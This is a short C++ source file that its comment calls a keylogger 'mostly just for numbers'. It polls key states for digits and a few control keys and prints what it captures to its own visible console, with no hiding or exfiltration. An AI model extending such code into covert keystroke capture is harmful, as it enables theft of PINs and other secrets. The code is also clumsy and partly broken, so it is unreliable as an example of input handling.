//KeyLogger, mostly just for numbers

#include <windows.h>
#include <string>
#include <ctime>
#include <iostream>
#include <stdlib.h> // system("CLS");
#include <fstream>
#include <thread>

HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
std::string theList = "";

std::string number1Key() {
	std::string keyState = "";
	while ((GetKeyState('1') & 0x800000) != 0)
	{
		keyState = "1";
	}
	return keyState;
}
std::string number2Key() {
	std::string keyState = "";
	while ((GetKeyState('2') & 0x800000) != 0)
	{
		keyState = "2";
	}
	return keyState;
}
std::string number3Key() {
	std::string keyState = "";
	while ((GetKeyState('3') & 0x800000) != 0)
	{
		keyState = "3";
	}
	return keyState;
}
std::string number4Key() {
	std::string keyState = "";
	while ((GetKeyState('4') & 0x800000) != 0)
	{
		keyState = "4";
	}
	return keyState;
}
std::string number5Key() {
	std::string keyState = "";
	while ((GetKeyState('5') & 0x800000) != 0)
	{
		keyState = "5";
	}
	return keyState;
}
std::string number6Key() {
	std::string keyState = "";
	while ((GetKeyState('6') & 0x800000) != 0)
	{
		keyState = "6";
	}
	return keyState;
}
std::string number7Key() {
	std::string keyState = "";
	while ((GetKeyState('7') & 0x800000) != 0)
	{
		keyState = "7";
	}
	return keyState;
}
std::string number8Key() {
	std::string keyState = "";
	while ((GetKeyState('8') & 0x800000) != 0)
	{
		keyState = "8";
	}
	return keyState;
}
std::string number9Key() {
	std::string keyState = "";
	while ((GetKeyState('9') & 0x800000) != 0)
	{
		keyState = "9";
	}
	return keyState;
}
std::string number0Key() {
	std::string keyState = "";
	while ((GetKeyState('0') & 0x800000) != 0)
	{
		keyState = "0";
	}
	return keyState;
}
std::string extraKey() {
	std::string keyState = "";
	while ((GetKeyState(' ') & 0x800000) != 0)
	{
		keyState = " ";
	}
	while ((GetKeyState(VK_RETURN) & 0x800000) != 0)
	{
		keyState = " (R) ";
	}
	while ((GetKeyState(VK_TAB) & 0x800000) != 0)
	{
		keyState = " (T) ";
	}
	while ((GetKeyState(VK_BACK) & 0x800000) != 0)
	{
		keyState = " (B) ";
	}
	return keyState;
}

std::string readAndWrite() {
	std::string keyState1 = number1Key();
	std::string keyState2 = number2Key();
	std::string keyState3 = number3Key();
	std::string keyState4 = number4Key();
	std::string keyState5 = number5Key();
	std::string keyState6 = number6Key();
	std::string keyState7 = number7Key();
	std::string keyState8 = number8Key();
	std::string keyState9 = number9Key();
	std::string keyState0 = number0Key();
	std::string extraKeys = extraKey();

	if (!(keyState1 == "")) {
		theList += keyState1;
		system("CLS");
		std::cout << theList;
	}
	if (!(keyState2 == "")) {
		theList += keyState2;
		system("CLS");
		std::cout << theList;
	}
	if (!(keyState3 == "")) {
		theList += keyState3;
		system("CLS");
		std::cout << theList;
	}
	if (!(keyState4 == "")) {
		theList += keyState4;
		system("CLS");
		std::cout << theList;
	}
	if (!(keyState5 == "")) {
		theList += keyState5;
		system("CLS");
		std::cout << theList;
	}
	if (!(keyState6 == "")) {
		theList += keyState6;
		system("CLS");
		std::cout << theList;
	}
	if (!(keyState7 == "")) {
		theList += keyState7;
		system("CLS");
		std::cout << theList;
	}
	if (!(keyState8 == "")) {
		theList += keyState8;
		system("CLS");
		std::cout << theList;
	}
	if (!(keyState9 == "")) {
		theList += keyState9;
		system("CLS");
		std::cout << theList;
	}
	if (!(keyState0 == "")) {
		theList += keyState0;
		system("CLS");
		std::cout << theList;
	}
	if (!(extraKeys == "")) {
		theList += extraKeys;
		system("CLS");
		std::cout << theList;
	}
	return "";
}

int main() {
	SetConsoleTextAttribute(hConsole, 10); // Hacker Green
	std::cout << "TEST" << std::endl;

	while (true) {		
		
		std::thread number1Thread(number1Key);
		std::thread number2Thread(number2Key);
		std::thread number3Thread(number3Key);
		std::thread number4Thread(number4Key);
		std::thread number5Thread(number5Key);
		std::thread number6Thread(number6Key);
		std::thread number7Thread(number7Key);
		std::thread number8Thread(number8Key);
		std::thread number9Thread(number9Key);
		std::thread number0Thread(number0Key);
		std::thread extraKeysThread(extraKey);

		number1Thread.join();
		number2Thread.join();
		number3Thread.join();
		number4Thread.join();
		number5Thread.join();
		number6Thread.join();
		number7Thread.join();
		number8Thread.join();
		number9Thread.join();
		number0Thread.join();
		extraKeysThread.join();

		readAndWrite();
	} 
	Sleep(3000);
	return theList.length();
}



